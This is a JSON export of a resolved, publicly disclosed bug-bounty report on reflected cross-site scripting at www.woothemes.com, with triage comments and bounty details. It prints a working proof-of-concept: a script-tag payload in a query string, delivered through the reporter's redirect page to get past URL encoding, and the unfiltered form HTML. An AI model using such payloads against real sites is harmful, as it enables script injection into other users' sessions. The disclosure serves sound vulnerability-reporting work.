{"id":111365,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTEzNjU=","url":"https://hackerone.com/reports/111365","title":"XSS at www.woothemes.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-01-18T07:05:59.393Z","submitted_at":"2016-01-18T07:05:59.393Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"valievkarim","url":"/valievkarim","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-02-19T10:20:43.468Z","bug_reporter_agreed_on_going_public_at":"2016-01-20T10:20:28.989Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This XSS vulnerability can be used against IE browsers.\nThere is an XSS filter in modern IE browsers, so to reproduce we should turn XSS filter off (http://answers.microsoft.com/en-us/ie/forum/ie9-windows_7/how-do-i-turn-off-cross-site-scripting-i-can-no/f3058b73-4956-e011-8dfc-68b599b31bf5?auth=1), or take an old browser without XSS filter (IE7). \nBypassing an XSS filter in IE will not be covered in this report.\n\nTested with IE11 with XSS filter disabled and with IE7.\nThe redirect is used to bypass query string encoding.\n\n1) Visit http://95.213.191.146/r.php?url=http%3A%2F%2Fwww.woothemes.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\n2) It redirects to http://www.woothemes.com/product-category/woocommerce-extensions/?\"\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n3) the alert is shown on www.woothemes.com\n\nThe vulnerable URL:\nhttp://www.woothemes.com/product-category/woocommerce-extensions/?\"\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n\nThe vulnerability occurs because the 'action' attribute is not properly filtered at the page:\n\n    \u003cform class=\"search\" id=\"productSearchForm\" action=\"/product-category/woocommerce-extensions/?23946\\\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e0a7f2=1\"\u003e\n\nScreenshot is attached.","vulnerability_information_html":"\u003cp\u003eThis XSS vulnerability can be used against IE browsers.\u003cbr\u003e\nThere is an XSS filter in modern IE browsers, so to reproduce we should turn XSS filter off (\u003ca title=\"http://answers.microsoft.com/en-us/ie/forum/ie9-windows_7/how-do-i-turn-off-cross-site-scripting-i-can-no/f3058b73-4956-e011-8dfc-68b599b31bf5?auth=1\" href=\"/redirect?url=http%3A%2F%2Fanswers.microsoft.com%2Fen-us%2Fie%2Fforum%2Fie9-windows_7%2Fhow-do-i-turn-off-cross-site-scripting-i-can-no%2Ff3058b73-4956-e011-8dfc-68b599b31bf5%3Fauth%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://answers.microsoft.com/en-us/ie/forum/ie9-windows_7/how-do-i-turn-off-cross-site-scripting-i-can-no/f3058b73-4956-e011-8dfc-68b599b31bf5?auth=1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), or take an old browser without XSS filter (IE7). \u003cbr\u003e\nBypassing an XSS filter in IE will not be covered in this report.\u003c/p\u003e\n\n\u003cp\u003eTested with IE11 with XSS filter disabled and with IE7.\u003cbr\u003e\nThe redirect is used to bypass query string encoding.\u003c/p\u003e\n\n\u003cp\u003e1) Visit \u003ca title=\"http://95.213.191.146/r.php?url=http%3A%2F%2Fwww.woothemes.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\" href=\"/redirect?url=http%3A%2F%2F95.213.191.146%2Fr.php%3Furl%3Dhttp%253A%252F%252Fwww.woothemes.com%252Fproduct-category%252Fwoocommerce-extensions%252F%253F%2522%253E%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://95.213.191.146/r.php?url=http%3A%2F%2Fwww.woothemes.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n2) It redirects to \u003ca title=\"http://www.woothemes.com/product-category/woocommerce-extensions/?%22%3E\" href=\"/redirect?url=http%3A%2F%2Fwww.woothemes.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%2522%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.woothemes.com/product-category/woocommerce-extensions/?%22%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u003cbr\u003e\n3) the alert is shown on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.woothemes.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.woothemes.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe vulnerable URL:\u003cbr\u003e\n\u003ca title=\"http://www.woothemes.com/product-category/woocommerce-extensions/?%22%3E\" href=\"/redirect?url=http%3A%2F%2Fwww.woothemes.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%2522%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.woothemes.com/product-category/woocommerce-extensions/?%22%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability occurs because the \u0026#39;action\u0026#39; attribute is not properly filtered at the page:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;form class=\u0026quot;search\u0026quot; id=\u0026quot;productSearchForm\u0026quot; action=\u0026quot;/product-category/woocommerce-extensions/?23946\\\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;0a7f2=1\u0026quot;\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eScreenshot is attached.\u003c/p\u003e\n","bounty_amount":"75.0","formatted_bounty":"$75","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":69752,"file_name":"woothemes-xss.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/069/752/e5ef011738b4d54dde79fcddd4f6cddb5402240d/woothemes-xss.png?response-content-disposition=attachment%3B%20filename%3D%22woothemes-xss.png%22%3B%20filename%2A%3DUTF-8%27%27woothemes-xss.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUELEOUFM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041624Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEHcXLEQPeJ1NbEZdJXi%2BjDjW%2Brvnvj%2FJxEOqy4HmeuwAiBgfPiwnDW5VOmXCmdoSe8v4i4f3S1PrDzJHYj%2FK50vXSq0AwhTEAEaDDAxMzYxOTI3NDg0OSIMaRbp4M0ZZ3Ux0slgKpEDvGtg639OjuV4555YTXv0v1%2B3YeZYF7O3onBjNlgrOhYRA2lprfPhUel71T%2FX8MbclnF3ZoJTRbh1SdgGfYOStDOta4s40bALV9ZmACLawkbdV5j9rxJ9pCGv21GYDtjHl%2BVgYvqeUwT5NO%2BGzBJrB503UxwAbns4iOwLRos1I4mDZe8lyTK4OMOf2a1zF%2BFTTlSMuC7w658c6qUWnC5%2BArvYu5FSuBUNrnkIR0rG7uhSI8ku8glS3yPDiQjxIRB%2F6CwvXzaA%2B2%2FNSYCsbFFNan5Z3Qv3Pw0xINQ1V2xkEBrKDV2pJ42QAmmq7rgxA7nqrBru1GFYFrIkNUKpGw7I9OnBd81CnAxR9SYAoa%2B6sQ2cYGkXqOUhL0i6m1jBJc%2FiP11Lb%2FbVovAvfjqWsjLoQGLW6ZOZXFlq4Bb6qVcqO%2FV489Jh7LKgvf31VImkKBHPJZwDVAxn2q5yPm6TakzKJPvE4pDzpxa7Nw3oQ8Knf4I3qGhuif9BXRI3vu%2BhplC7ximOU4kG0vG2MI8F3rK2Xxow8Y6q%2FwU67AGCwlwk%2Fh50Mwp%2FofR%2Be%2BD5LiLGKMPNwxJJuYfv0E3oKNIT9wTCjV1Id28if6r3Zw9qtUxsnDKkDk%2B14l2fH9vPhI8cfp9BDEEHlfIIuWpITf0EUwAKcW%2BaKDKVRx%2FLb6InewTMZ%2B%2FgFi6gBqHlzu6MCAeys7vQVufF0akHiMP%2BiPeXfKCLU%2F4r9BeqnyEJqvrxabHfVXrZG5WsK5OLFxwqz4j4dpwzxocYRpH4zbbfII18jPfcKEQtcvg9zCzIaEfzIbLATRocx3PcEQLLDsdGuqcKyAv9S5VdHnJUqfDX%2BAjGLQcwxhdjmh4WHg%3D%3D\u0026X-Amz-Signature=c5fe549f25ea4648e025f015e9e9aa60126206cfba7ebd1e01ccdaeed4bce312","file_size":93747,"type":"image/png"}],"allow_singular_disclosure_at":"2016-02-19T10:20:29.661Z","allow_singular_disclosure_after":-153338154.9681502,"singular_disclosure_allowed":true,"vote_count":2,"voters":["sl1m","spetr0x"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":763853,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there, thanks for reporting this. We have fixed the issue, can you please confirm that this is fixed on your end?","markdown_message":"\u003cp\u003eHi there, thanks for reporting this. We have fixed the issue, can you please confirm that this is fixed on your end?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-19T18:00:25.030Z","updated_at":"2016-01-19T18:00:25.030Z","actor":{"username":"gerhard","cleared":false,"url":"/gerhard","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":764441,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, I confirm it's fixed!","markdown_message":"\u003cp\u003eYes, I confirm it\u0026#39;s fixed!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-19T22:56:25.891Z","updated_at":"2016-01-19T22:56:25.891Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":764565,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-01-20T01:03:04.774Z","updated_at":"2016-01-20T01:03:04.774Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"valievkarim","url":"/valievkarim"},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":764566,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-01-20T01:03:18.605Z","updated_at":"2016-01-20T01:03:18.605Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"bounty_amount":"75.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"automattic","collaborator":{"username":"valievkarim","url":"/valievkarim"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":764923,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you! Can we disclose it?","markdown_message":"\u003cp\u003eThank you! Can we disclose it?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-20T10:20:29.010Z","updated_at":"2016-01-20T10:20:29.010Z","first_to_agree":true,"actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":804146,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-02-19T10:20:43.517Z","updated_at":"2016-02-19T10:20:43.517Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}